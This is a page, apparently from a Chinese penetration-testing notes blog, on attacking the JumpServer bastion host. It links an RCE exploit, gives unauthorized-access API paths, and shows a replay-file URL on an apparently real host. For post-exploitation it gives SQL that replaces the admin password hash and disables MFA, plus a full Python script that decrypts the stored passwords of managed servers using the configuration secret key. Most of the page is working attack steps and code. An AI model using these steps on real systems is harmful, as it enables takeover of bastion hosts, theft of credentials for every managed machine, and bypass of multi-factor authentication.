@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>jumpserver堡垒机 - ConsT27's Blog</title>
+    <link href="../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "jumpserver\u5821\u5792\u673a", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "\u6e17\u900f", url: "#_2" },
+              {title: "\u540e\u6e17\u900f", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../nacos/nacos/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../nacos/nacos/" class="btn btn-xs btn-link">
+        nacos
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../jenkins/jenkins/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../jenkins/jenkins/" class="btn btn-xs btn-link">
+        jenkins
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="jumpserver">jumpserver堡垒机</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#渗透">渗透</a><ul>
+<li><a href="#rce">rce</a></li>
+<li><a href="#未授权访问">未授权访问</a></li>
+</ul>
+</li>
+<li><a href="#后渗透">后渗透</a><ul>
+<li><a href="#读取配置文件">读取配置文件</a></li>
+<li><a href="#改数据库进web">改数据库进web</a></li>
+<li><a href="#托管机器的账户密码获取">托管机器的账户密码获取</a></li>
+<li><a href="#mfa操作">mfa操作</a></li>
+<li><a href="#查看运维记录">查看运维记录</a></li>
+</ul>
+</li>
+</ul>
+<p>开源堡垒机</p>
+<h2 id="_2">渗透</h2>
+<h3 id="rce">rce</h3>
+<ul>
+<li>JumpServer &lt; v2.6.2</li>
+<li>JumpServer &lt; v2.5.4</li>
+<li>JumpServer &lt; v2.4.5</li>
+<li>JumpServer = v1.5.9</li>
+</ul>
+<p><a href="https://github.com/Veraxy00/Jumpserver-EXP" title="https://github.com/Veraxy00/Jumpserver-EXP">https://github.com/Veraxy00/Jumpserver-EXP</a></p>
+<h3 id="_3">未授权访问</h3>
+<p>3.0.0 &lt;= JumpServer &lt;= 3.6.3</p>
+<p>目前各大CERT给出的payload是
+/api/v1/terminal/sessions/&#x20;
+或/api/v1/terminal/sessions/?limit=1或
+/api/v1/terminal/sessions.json?limit=1</p>
+<p><img alt="" src="../image/image_QXiE8JsjWQ.png" /></p>
+<p>然后就可以下载视频文件（不确定该payload是否有效）</p>
+<pre><code class="language-纯文本">http://soho1.physis.com.cn:8600/media/xpack/../replay/2023-09-21/a7cf55c5-8d72-49e7-943c-486fed057047.cast.gz
+</code></pre>
+<p><img alt="" src="../image/image_KmouKGvsh6.png" /></p>
+<h2 id="_4">后渗透</h2>
+<h3 id="_5">读取配置文件</h3>
+<p><a href="https://docs.jumpserver.org/zh/master/admin-guide/env/" title="https://docs.jumpserver.org/zh/master/admin-guide/env/">https://docs.jumpserver.org/zh/master/admin-guide/env/</a> 配置文件参数列表</p>
+<pre><code class="language-纯文本">vi /opt/jumpserver/config/config.txt
+
+</code></pre>
+<h3 id="web">改数据库进web</h3>
+<p>hash无法解密，因为被多次hash</p>
+<pre><code class="language-纯文本">#查看用户表
+selelct * from users_user;
+
+</code></pre>
+<pre><code class="language-纯文本">#备份原始密码
+select password from users_user where username='admin'
+</code></pre>
+<pre><code class="language-纯文本">#替换密文为yyds@1234
+update users_user set password='pbkdf2_sha256$260000$OcZu99PdSdBwb7cqNHB778$kg8kDAcG24M0baJat3O/uX1IxTFWXtJGfbalY+7Pj84=' where username='admin'
+</code></pre>
+<p>如果开启了mfa二次认证，则需要绕过，后文会谈及</p>
+<h3 id="_6">托管机器的账户密码获取</h3>
+<p>前提需要</p>
+<ul>
+<li>db数据库权限，查看托管账号密码密文</li>
+<li>jumpserver系统权限，查看配置文件获取加密secret_key</li>
+</ul>
+<p><img alt="" src="../image/image_d4w9ikT2XM.png" /></p>
+<p>资产管理→资产列表 可以查看密码</p>
+<p>但是看密码需要开启mfa才行。</p>
+<p>但是我们可以进入数据库执行如下命令获取secret</p>
+<pre><code class="language-纯文本">select * from accounts_account;
+</code></pre>
+<p>然后把secret和secret_key放入如下脚本运行即可得到明文。</p>
+<pre><code class="language-纯文本">#coding:utf-8
+import json
+import base64
+from Cryptodome.Cipher import AES
+from Cryptodome.Util.Padding import pad
+from Cryptodome.Random import get_random_bytes
+from gmssl.sm4 import CryptSM4, SM4_ENCRYPT, SM4_DECRYPT
+
+
+def signer_decode(val: str):
+    data = val.split(&quot;.&quot;)[1]
+    data = data + &quot;=&quot; * (-len(data) % 4)
+    return json.loads(base64.b64decode(data))
+
+
+def process_key(key):
+    &quot;&quot;&quot;
+    返回32 bytes 的key
+    &quot;&quot;&quot;
+    if not isinstance(key, bytes):
+        key = bytes(key, encoding='utf-8')
+
+    if len(key) &gt;= 32:
+        return key[:32]
+
+    return pad(key, 32)
+
+
+class BaseCrypto:
+
+    def encrypt(self, text):
+        return base64.urlsafe_b64encode(
+            self._encrypt(bytes(text, encoding='utf8'))).decode('utf8')
+
+    def _encrypt(self, data: bytes) -&gt; bytes:
+        raise NotImplementedError
+
+    def decrypt(self, text):
+        return self._decrypt(
+            base64.urlsafe_b64decode(bytes(text,
+                                           encoding='utf8'))).decode('utf8')
+
+    def _decrypt(self, data: bytes) -&gt; bytes:
+        raise NotImplementedError
+
+
+class GMSM4EcbCrypto(BaseCrypto):
+
+    def __init__(self, key):
+        self.key = process_key(key)
+        self.sm4_encryptor = CryptSM4()
+        self.sm4_encryptor.set_key(self.key, SM4_ENCRYPT)
+
+        self.sm4_decryptor = CryptSM4()
+        self.sm4_decryptor.set_key(self.key, SM4_DECRYPT)
+
+    def _encrypt(self, data: bytes) -&gt; bytes:
+        return self.sm4_encryptor.crypt_ecb(data)
+
+    def _decrypt(self, data: bytes) -&gt; bytes:
+        return self.sm4_decryptor.crypt_ecb(data)
+
+
+class AESCrypto:
+    &quot;&quot;&quot;
+    AES
+    除了MODE_SIV模式key长度为：32, 48, or 64,
+    其余key长度为16, 24 or 32
+    详细见AES内部文档
+    CBC模式传入iv参数
+    本例使用常用的ECB模式
+    &quot;&quot;&quot;
+
+    def __init__(self, key):
+        if len(key) &gt; 32:
+            key = key[:32]
+        self.key = self.to_16(key)
+
+    @staticmethod
+    def to_16(key):
+        &quot;&quot;&quot;
+        转为16倍数的bytes数据
+        :param key:
+        :return:
+        &quot;&quot;&quot;
+        key = bytes(key, encoding=&quot;utf8&quot;)
+        while len(key) % 16 != 0:
+            key += b'\0'
+        return key  # 返回bytes
+
+    def aes(self):
+        return AES.new(self.key, AES.MODE_ECB)  # 初始化加密器
+
+    def encrypt(self, text):
+        aes = self.aes()
+        return str(base64.encodebytes(aes.encrypt(self.to_16(text))),
+                   encoding='utf8').replace('\n', '')  # 加密
+
+    def decrypt(self, text):
+        aes = self.aes()
+        return str(
+            aes.decrypt(base64.decodebytes(bytes(
+                text, encoding='utf8'))).rstrip(b'\0').decode(&quot;utf8&quot;))  # 解密
+
+
+class AESCryptoGCM:
+    &quot;&quot;&quot;
+    使用AES GCM模式
+    &quot;&quot;&quot;
+
+    def __init__(self, key):
+        self.key = process_key(key)
+
+    def encrypt(self, text):
+        &quot;&quot;&quot;
+        加密text，并将 header, nonce, tag (3*16 bytes, base64后变为 3*24 bytes)
+        附在密文前。解密时要用到。
+        &quot;&quot;&quot;
+        header = get_random_bytes(16)
+        cipher = AES.new(self.key, AES.MODE_GCM)
+        cipher.update(header)
+        ciphertext, tag = cipher.encrypt_and_digest(
+            bytes(text, encoding='utf-8'))
+
+        result = []
+        for byte_data in (header, cipher.nonce, tag, ciphertext):
+            result.append(base64.b64encode(byte_data).decode('utf-8'))
+
+        return ''.join(result)
+
+    def decrypt(self, text):
+        &quot;&quot;&quot;
+        提取header, nonce, tag并解密text。
+        &quot;&quot;&quot;
+        metadata = text[:72]
+        header = base64.b64decode(metadata[:24])
+        nonce = base64.b64decode(metadata[24:48])
+        tag = base64.b64decode(metadata[48:])
+        ciphertext = base64.b64decode(text[72:])
+
+        cipher = AES.new(self.key, AES.MODE_GCM, nonce=nonce)
+
+        cipher.update(header)
+        plain_text_bytes = cipher.decrypt_and_verify(ciphertext, tag)
+        return plain_text_bytes.decode('utf-8')
+
+
+def get_aes_crypto(key, mode='GCM'):
+    if mode == 'ECB':
+        a = AESCrypto(key)
+    elif mode == 'GCM':
+        a = AESCryptoGCM(key)
+    return a
+
+
+def get_gm_sm4_ecb_crypto(key):
+    return GMSM4EcbCrypto(key)
+
+
+class Crypto:
+
+    def __init__(self, cryptoes):
+        self.cryptoes = cryptoes
+
+    @property
+    def encryptor(self):
+        return self.cryptoes[0]
+
+    def encrypt(self, text):
+        return self.encryptor.encrypt(text)
+
+    def decrypt(self, text):
+        for decryptor in self.cryptoes:
+            try:
+                origin_text = decryptor.decrypt(text)
+                if origin_text:
+                    # 有时不同算法解密不报错，但是返回空字符串
+                    return origin_text
+            except (TypeError, ValueError, UnicodeDecodeError, IndexError):
+                continue
+
+
+if __name__ == &quot;__main__&quot;:
+    # SECRET_KEY
+    key = 'MkMyRDRENTYtNEZGRC0wODU1LUM1OEItNjRFNTJFMzM4RkYz'
+    # private_key 或 password 在数据库里的值
+    data = [
+        'Ktue2Otr3+hNOLUhnw3bYQ==rmIL8fQxUl0pyaxmDjN+8A==d0OpU7SFlekcuI/l8QLXBg==YgMxn/UGQzXluJBkEO9zyg==',
+        '8z7u+nwaP/vI+JL1yzEWkw==Uw3O+MKsVmjdWfK6fbjO0w==pWJgXplH1Va1FQd5AfXA9Q==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'
+    ]
+    crypto = Crypto([
+        get_aes_crypto(key, mode='ECB'),
+        get_aes_crypto(key, mode='GCM'),
+        get_gm_sm4_ecb_crypto(key),
+    ])
+    print('by encrypt:', crypto.encrypt('J2AT6ATXT3AL4444'))
+    for d in data:
+        if d.count(&quot;.&quot;) == 2:
+            print('by signer:', signer_decode(d))
+        else:
+
+            print('by crypto:', crypto.decrypt(d))
+
+
+</code></pre>
+<h3 id="mfa">mfa操作</h3>
+<pre><code class="language-纯文本">#关闭mfa
+update users_user set mfa_level=0 where username='admin'
+#开启mfa
+update users_user set mfa_level=1 where username='admin'
+</code></pre>
+<h3 id="_7">查看运维记录</h3>
+<pre><code class="language-纯文本">SELECT * FROM jumpserver.terminal_command
+</code></pre>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../nacos/nacos/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../nacos/nacos/" class="btn btn-xs btn-link">
+        nacos
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../jenkins/jenkins/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../jenkins/jenkins/" class="btn btn-xs btn-link">
+        jenkins
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
